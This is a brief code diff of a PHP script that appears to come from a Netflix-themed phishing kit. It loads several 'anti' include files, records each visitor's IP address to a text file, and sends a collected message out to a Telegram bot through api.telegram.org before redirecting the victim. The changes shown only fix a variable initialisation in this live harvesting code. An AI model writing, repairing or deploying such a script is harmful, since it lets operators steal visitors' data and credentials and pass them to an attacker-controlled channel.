@@ -7,7 +7,7 @@ include "anti/anti4.php";
 include "anti/anti5.php"; 
 include "anti/anti7.php"; 
 include "email.php";
-
+$msg = "";   // Initialize first
 $ip = getenv("REMOTE_ADDR");
 
 $file = fopen("NetFlix_VISIT.txt","a");
@@ -30,4 +30,5 @@ $msg .=
 
 file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
 header("Location: app/");
+
 ?>
